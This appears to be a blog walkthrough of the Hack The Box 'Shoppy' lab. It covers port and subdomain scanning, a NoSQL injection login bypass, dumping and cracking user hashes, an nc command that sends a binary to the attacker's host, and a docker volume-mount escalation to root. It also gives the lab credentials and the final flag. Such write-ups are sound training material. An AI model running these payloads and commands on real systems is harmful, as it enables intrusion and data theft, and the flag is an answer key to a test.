---
layout: post
title:  Hack the Box pentest Shoppy
image: /assets/img/HTB-Logo.png
date:   2023-01-12 15:49:01
tags:
- pentest
description: Basic pentest challenge
categories:
- Hack The Box
- Pentest
---

![](/assets/img/2023-01-12-15-04-47.png)


Run nmap on the IP we get 2 ports open, port 80 and port 22 for SSH:

```
# Nmap 7.93 scan initiated Thu Jan 12 05:45:47 2023 as: nmap -sV -Pn -oN nmap.out 10.10.11.180
Nmap scan report for 10.10.11.180
Host is up (0.028s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 12 05:46:02 2023 -- 1 IP address (1 host up) scanned in 15.07 seconds
```

The first page looks like:

![](/assets/img/2023-01-12-14-21-04.png)

We run gobuster on the server and see a logon portal.

```
└─$ gobuster dir -w /home/kali/Desktop/stuff/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://shoppy.htb 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Desktop/stuff/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/12 05:48:47 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 302) [Size: 28] [--> /login]
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/js                   (Status: 301) [Size: 171] [--> /js/]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
Progress: 114441 / 114442 (100.00%)
===============================================================
2023/01/12 06:03:01 Finished
===============================================================
```

After trying the following github repos of SQL injections:

https://github.com/payloadbox/sql-injection-payload-list
https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/Intruder/NoSQL.txt
https://github.com/DevanshRaghav75/NoSQL_injection_stuff
https://book.hacktricks.xyz/pentesting-web/nosql-injection


I discovered that the following request worked:

```
POST /login?error=WrongCredentials HTTP/1.1

Host: shoppy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://shoppy.htb
Connection: close
Referer: http://shoppy.htb/login?error=WrongCredentials
Upgrade-Insecure-Requests: 1


username=admin'||' &password=admin
```
After logging in you have to work the search to discover another user:


Searching for `' || '1==1` will give you 2 accounts admin and josh. 

You cannot break the hash for admin, but for josh you can find it online:

```
0	
_id	"62db0e93d6d6a999a66ee67a"
username	"admin"
password	"23c6877d9e2b564ef8b32c3a23de27b2"
1	
_id	"62db0e93d6d6a999a66ee67b"
username	"josh"
password	"6ebcea65320589ca4f2f1ce039975995"
```
remembermethisway is the pass jor josh .

Next you need to do recon again, because we missed a subdomain.

`ffuf -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" -w /home/kali/Desktop/stuff/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt --fs 169 `

where fs is the size of the bad response.

Afterwards we can discover a password in the mattermost channel:

![](/assets/img/2023-01-12-14-43-49.png)

Using ssh we logon to the page and run linpeas.

We see that we can execute an executable as user deploy:

![](/assets/img/2023-01-12-14-45-28.png)

Afterwards we download the executable using nc `nc -w 3 10.10.14.77 8888 < /home/deploy/password-manager` .

We reverse engineer/ just cat the binary and get Sample as the password:

![](/assets/img/2023-01-12-14-47-39.png)

After getting the other user password which is granted by the manager upon entering Sample 

```
(Deploy Creds :
username: deploy
password: Deploying@pp!
)
```

We switch users, and look for a way to gain root. We run linpeas again, and look at the thing that we are in a docker container.

We run deepce and it gives us 2 leads.


![](/assets/img/2023-01-12-14-49-51.png)

The easiest for me was running `docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash` and this makes us root.

Last flag:


`ebb276b6cfee6bc206ffbf73797e937f`


